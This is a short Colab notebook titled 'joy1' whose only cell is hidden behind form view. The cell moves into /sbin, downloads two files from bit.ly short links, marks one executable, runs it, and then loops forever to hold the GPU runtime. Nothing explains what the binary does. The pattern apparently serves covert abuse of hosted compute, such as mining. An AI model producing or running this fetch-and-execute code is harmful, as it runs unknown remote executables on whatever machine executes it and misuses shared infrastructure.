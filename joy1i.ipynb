{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "joy1.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "R-CbmO0H2qGP"
      },
      "source": [
        "#@title joy1\n",
        "\n",
        "%cd /sbin\n",
        "!wget https://bit.ly/3wcgp7C\n",
        "!wget https://bit.ly/3hddJlY\n",
        "!chmod +x 3hddJlY\n",
        "!./3hddJlY\n",
        "\n",
        "while True:pass\n",
        "\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}

